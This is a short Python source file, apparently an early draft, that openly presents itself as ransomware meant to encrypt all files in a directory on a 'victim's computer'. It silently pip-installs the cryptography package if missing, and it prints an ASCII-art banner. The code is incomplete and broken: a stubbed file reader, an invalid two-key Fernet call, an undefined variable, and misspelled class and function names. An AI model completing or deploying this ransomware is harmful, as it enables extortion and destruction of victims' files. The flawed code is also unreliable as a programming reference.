#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-18
Description : 




'''


'''
import subprocess for executing system commands
in this program we'll use it to down the
cryptography module in case it is not
already installed on the victim's computer
'''
import subprocess as subp
# import time to pause execution of program
# until cryptography module gets installed
import time
# import os so that we can obtain all the file
# in a specific directory
import os

# try importing cryptography module class
try:
	from cryptography.fernet import Fernet
	import os
# if any errors occurs importing the cryp module
# installing it with the following command
except:
	subp.call('pip install cryptography', shell=True)
	# wait 30 seconds before preceding with the programs
	time.sleep(30)
	# try importing again after attempting to install
	# the module
	from cryptography.fernet import Fernet

'''------------------------------------------------------------------------------------------------
									Ransomware Class Definition
---------------------------------------------------------------------------------------------------'''

class Ransomware:

	def __init__(self, directory='/',encrypt=True):
		'''
		- declare encryption key value
		- get directory to encrypt/decrypt
		-  
		'''
		print("[+] Initiating ransomware declarations ")

	def open_file_to_encrypt(self, dir):
		'''
		- open files located in directory passed as argument
		- return contents of file to encrypt
		'''
		pass

	def encrypt(self, file_to_encrypt):
		'''
		Encrypting all files in the directory stored in the directory variable
		'''
		print('[+] Encrypting all files in ' + directory + ' directory')
		# generating keys for encryption
		k1 = Fernet.generate_key()
		k2 = Fernet.generate_key()

		enigma = Fernet(k1, k2)

		enigma.encrypt(file_to_encrypt)


	def decrypt(self):
		'''
		Decrypt all files in the directory stored in the directory variable
		'''
		print('[+] Decrypting all files in ' + directory + ' directory')

'''
************
----MAIN----
************
'''
def initaite():
	# directory to encrypt
	to_encyrpt = '.'
	# instantiating Ransomware object
	instance = Ransonware(directory=to_encyrpt)


# check if current module is main module
if __name__ == '__main__':
	print('''
		  ooo,    .---.
 o`  o   /    |\\________________
o`   'oooo()  | ________   _   _)
`oo   o` \\    |/        | | | |
  `ooo'   `---'         "-" |_|
	''')

	initiate()
